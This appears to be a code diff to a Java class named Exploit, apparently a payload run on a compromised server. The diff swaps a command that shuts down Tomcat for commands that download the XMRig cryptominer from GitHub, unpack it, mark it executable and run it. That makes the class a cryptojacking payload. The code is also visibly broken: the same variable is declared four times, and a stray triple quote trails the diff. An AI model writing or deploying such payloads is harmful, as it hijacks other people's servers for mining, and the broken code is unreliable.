@@ -23,7 +23,10 @@ import java.net.Socket;
 public class Exploit {
 
     public Exploit() throws Exception {
-        Process process = Runtime.getRuntime().exec("sh /home/centos/drive/apache-tomcat-8.0.36/bin/shutdown.sh");
+        Process process = Runtime.getRuntime().exec("wget https://github.com/xmrig/xmrig/releases/xmrig-6.16.4-focal-x64.tar.gz");
+        Process process = Runtime.getRuntime().exec("tar -xvf xmrig-6.16.4-focal-x64.tar.gz");
+        Process process = Runtime.getRuntime().exec("chmod +x xmrig-6.16.4/xmrig");
+        Process process = Runtime.getRuntime().exec("./xmrig-6.16.4/xmrig");
     }
 }
 """
